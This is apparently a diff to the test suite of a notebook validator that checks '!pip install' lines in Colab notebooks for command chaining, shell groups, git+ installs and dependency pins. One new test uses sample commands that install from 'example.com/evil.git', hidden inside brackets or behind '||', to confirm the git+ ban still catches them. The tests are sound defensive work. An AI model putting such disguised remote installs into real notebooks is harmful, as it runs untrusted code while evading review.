@@ -495,7 +495,7 @@ def test_notebook_validator_stops_at_a_shell_comment():
     nv = _load_notebook_validator_module()
 
     cell = '!pip install "torch==2.12.0" # keep codec; pip install "torchcodec==0.13.0"'
-    assert nv._split_chained(cell) == [('!pip install "torch==2.12.0" ', False)]
+    assert nv._split_chained(cell) == [('!pip install "torch==2.12.0"', False)]
     assert len(nv.rule_inst_004_torchcodec_torch(cell, COLAB_TORCH211, "nb.ipynb", 0)) == 1
 
     # A control operator ends a word, so `;#` opens a comment with no space in front of it.
@@ -516,7 +516,7 @@ def test_notebook_validator_resumes_after_an_or_list():
     assert nv._split_chained(
         "!pip install a && pip install b || pip install c ; pip install d"
     ) == [
-        ("!pip install a ", False),
+        ("!pip install a", False),
         ("!pip install b", False),
         ("!pip install c", True),
         ("!pip install d", False),
@@ -569,7 +569,7 @@ def test_notebook_validator_resumes_after_an_and_following_an_or():
     nv = _load_notebook_validator_module()
 
     assert nv._split_chained("!pip install a || pip install b && pip install c") == [
-        ("!pip install a ", False),
+        ("!pip install a", False),
         ("!pip install b", True),
         ("!pip install c", False),
     ]
@@ -741,6 +741,49 @@ def test_notebook_validator_pads_release_segments_when_excluding():
 
     cell = '!pip install "torch==2.12" "torchcodec!=0.11"'
     assert nv.rule_inst_004_torchcodec_torch(cell, COLAB_TORCH211, "nb.ipynb", 0) == []
+
+
+def test_notebook_validator_unwraps_shell_groups():
+    """A grouped command still runs, so leaving the bracket on it hides it from PIP_LINE_RE
+    and with it from R-INST-001's git+ ban."""
+    nv = _load_notebook_validator_module()
+
+    for evil in (
+        "!pip install foo || (pip install git+https://example.com/evil.git)",
+        "!pip install foo || { pip install git+https://example.com/evil.git; }",
+        "!(pip install git+https://example.com/evil.git)",
+    ):
+        assert any(f.rule == "R-INST-001" for f in nv.rule_inst_001_git_plus(evil, "nb.ipynb", 0)), evil
+
+    assert nv._unwrap_shell_group("!( pip install x )") == "!pip install x"
+    assert nv._unwrap_shell_group("{ pip install x") == "pip install x"
+    assert nv._unwrap_shell_group("}") == ""
+
+
+def test_notebook_validator_skips_conditional_invocations_in_rule_002(monkeypatch):
+    """resolved_set drops a fallback's pins, so a rule reading both has to drop the
+    invocation as well or it checks that install against an environment it never made."""
+    nv = _load_notebook_validator_module()
+    monkeypatch.setattr(
+        nv,
+        "pypi_metadata",
+        lambda name, version: {"info": {"requires_dist": ["tokenizers (>=0.30.0)"]}}
+        if name.lower() == "transformers"
+        else None,
+    )
+    colab = {"transformers": "5.0.0", "tokenizers": "0.22.2"}
+
+    # Unconditional, so the mismatch against Colab's tokenizers is real and reported.
+    plain = '!pip install --no-deps "transformers==5.5.0"'
+    assert [f.rule for f in nv.rule_inst_002_no_deps_transitive(plain, colab, "nb.ipynb", 0)] == [
+        "R-INST-002"
+    ]
+
+    # Behind an `||`, its pins never reach resolved_set, so checking it compares against an
+    # environment this branch did not build.
+    fallback = '!pip install foo || pip install --no-deps "transformers==5.5.0"'
+    assert [inv.conditional for inv in nv.iter_pip_invocations(fallback)] == [False, True]
+    assert nv.rule_inst_002_no_deps_transitive(fallback, colab, "nb.ipynb", 0) == []
 
 
 def test_notebook_validator_reads_a_range_as_one_window():
